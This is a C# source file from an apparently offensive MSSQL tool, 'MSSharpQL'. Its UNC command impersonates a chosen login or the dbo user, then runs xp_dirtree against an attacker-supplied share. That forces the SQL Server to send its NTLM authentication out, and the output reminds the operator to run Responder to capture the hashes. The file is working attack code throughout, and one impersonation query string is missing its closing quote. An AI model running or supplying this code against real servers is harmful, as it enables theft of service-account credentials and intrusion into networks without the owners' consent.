using System;
using System.Data.SqlClient;

namespace MSSharpQL.Commands
{
    internal class UNC
    {
        public static void InjectUNC(string userToImpersonate, string shareIP, string shareDir, string sqlServer, string database)
        {
            string targetshare = $"\\\\{shareIP}\\{shareDir}";
            string conStr = $"Server = {sqlServer}; Database = {database}; Integrated Security = True;";
            string getCurrentDBUser = "Select USER_NAME();";
            string output = "";
            string dirTree = $"EXEC master..xp_dirtree \"{targetshare}\";";
            string getCurrentUserSA = "Select SUSER_SNAME();";
            string impersonateLoginUser = $"EXECUTE AS LOGIN = '{userToImpersonate}';";
            string impersonateDbUser = $"EXECUTE AS USER = '{userToImpersonate}";

            using (SqlConnection con = new SqlConnection(conStr))
            {
                try
                {
                    con.Open();

                    Connection.DatabaseConnection.GetLoginInformation(conStr, con);

                    if (!string.IsNullOrEmpty(userToImpersonate))
                    {
                        Console.WriteLine($"[+] Attempting to impersonate {userToImpersonate}.");
                        if (userToImpersonate != "dbo")
                        {
                            Connection.DatabaseConnection.ExecuteQuery(impersonateLoginUser, con);
                            output = Connection.DatabaseConnection.ExecuteQuery(getCurrentUserSA, con);
                        }
                        else
                        {
                            Connection.DatabaseConnection.ExecuteQuery(impersonateDbUser, con);
                            output = Connection.DatabaseConnection.ExecuteQuery(getCurrentDBUser, con);
                        }
                        Console.WriteLine($"    [+] Current User: {output}");
                    }

                    Console.WriteLine($"[+] Attempting to force target MSSQL Server NTLM authenticate to: {targetshare}");
                    string res = Connection.DatabaseConnection.ExecuteQuery(dirTree, con);
                    Console.WriteLine("[+] Forced MSSQL Server NTLM authentication.");
                    Console.WriteLine("[+] Don't forget to have Responder running!");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error: {ex.Message}");
                }
            }
        }
    }
}
